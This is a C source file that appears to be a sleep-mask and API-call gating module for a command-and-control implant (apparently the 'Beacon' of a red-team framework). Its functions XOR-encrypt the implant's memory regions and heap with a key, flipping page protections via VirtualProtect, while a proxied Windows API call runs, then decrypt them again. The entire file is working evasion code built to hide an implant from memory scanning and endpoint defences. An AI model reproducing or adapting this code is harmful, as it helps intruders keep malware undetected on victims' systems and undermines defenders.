#include <windows.h>
#include "beacon.h"
#include "sleepmask.h"
#include "beacon_gate.h"
#include "tcg.h"

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

void gate_wrapper ( PFUNCTION_CALL function_call )
{
    ULONG_PTR result = 0;

    switch ( function_call->numOfArgs )
    {
    case 0:
        result = beaconGate ( 00 ) ( );
        break;

    case 1:
        result = beaconGate ( 01 ) ( arg ( 0 ) );
        break;

    case 2:
        result = beaconGate ( 02 ) ( arg ( 0 ), arg ( 1 ) );
        break;

    case 3:
        result = beaconGate ( 03 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ) );
        break;

    case 4:
        result = beaconGate ( 04 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ) );
        break;

    case 5:
        result = beaconGate ( 05 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ) );
        break;

    case 6:
        result = beaconGate ( 06 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ) );
        break;

    case 7:
        result = beaconGate ( 07 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ) );
        break;

    case 8:
        result = beaconGate ( 08 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ) );
        break;

    case 9:
        result = beaconGate ( 09 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ), arg ( 8 ) );
        break;

    case 10:
        result = beaconGate ( 10 ) ( arg ( 0 ), arg ( 1 ), arg ( 2 ), arg ( 3 ), arg ( 4 ), arg ( 5 ), arg ( 6 ), arg ( 7 ), arg ( 8 ), arg ( 9 ) );
        break;
    
    default:
        break;
    }

    function_call->retValue = result;
}

void xor ( char * buffer, size_t buffer_len, char * key, size_t key_len )
{
    for ( size_t i = 0; i < buffer_len; i++ )
    {
        buffer [ i ] ^= key [ i % key_len ];
    }
}

BOOL can_write ( DWORD protection )
{
    switch ( protection )
    {
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
        return TRUE;
    
    default:
        return FALSE;
    }
}

void mask_section ( PALLOCATED_MEMORY_SECTION section, char * key, BOOL mask )
{
    DWORD old_protect = 0;

    if ( mask && ! can_write ( section->CurrentProtect ) )
    {
        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->VirtualSize, PAGE_READWRITE, &old_protect ) )
        {
            section->CurrentProtect  = PAGE_READWRITE;
            section->PreviousProtect = old_protect;
        }
    }

    if ( can_write ( section->CurrentProtect ) ) {
        xor ( section->BaseAddress, section->VirtualSize, key, MASK_SIZE );
    }

    if ( ! mask && section->CurrentProtect != section->PreviousProtect )
    {
        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->VirtualSize, section->PreviousProtect, &old_protect ) )
        {
            section->CurrentProtect  = section->PreviousProtect;
            section->PreviousProtect = old_protect;
        }
    }
}

void mask_region ( ALLOCATED_MEMORY_REGION * region, char * key, BOOL mask )
{
    int section_count = sizeof ( region->Sections ) / sizeof ( ALLOCATED_MEMORY_SECTION );
    
    for ( int i = 0; i < section_count; i++ )
    {
        if ( region->Sections[i].BaseAddress == NULL || region->Sections[i].VirtualSize == 0 ) {
            continue;
        }

        if ( region->Sections[i].MaskSection ) {
            mask_section ( &region->Sections[i], key, mask );
        }
    }
}

void mask_beacon ( PBEACON_INFO beacon_info, BOOL mask )
{
    int region_count = sizeof ( beacon_info->allocatedMemory.AllocatedMemoryRegions ) / sizeof ( ALLOCATED_MEMORY_REGION );
    
    for ( size_t i = 0; i < region_count; i++ )
    {
        if ( beacon_info->allocatedMemory.AllocatedMemoryRegions[i].Purpose == PURPOSE_BEACON_MEMORY )
        {
            mask_region ( &beacon_info->allocatedMemory.AllocatedMemoryRegions[i], beacon_info->mask, mask );
            break;
        }
    }
}

void mask_heap ( PBEACON_INFO beacon_info )
{
    int count = 0;

    do
    {
        xor ( beacon_info->heap_records[count].ptr, beacon_info->heap_records[count].size, beacon_info->mask, MASK_SIZE );
        count++;

    } while ( beacon_info->heap_records[count].ptr != NULL );
}

void mask_memory ( PBEACON_INFO beacon_info, BOOL mask )
{
    mask_beacon ( beacon_info, mask );
    mask_heap ( beacon_info );
}

void go ( PBEACON_INFO beacon_info, PFUNCTION_CALL function_call )
{
    if ( function_call->bMask ) {
        mask_memory ( beacon_info, TRUE );
    }

    gate_wrapper ( function_call );

    if ( function_call->bMask ) {
        mask_memory ( beacon_info, FALSE );
    }
}
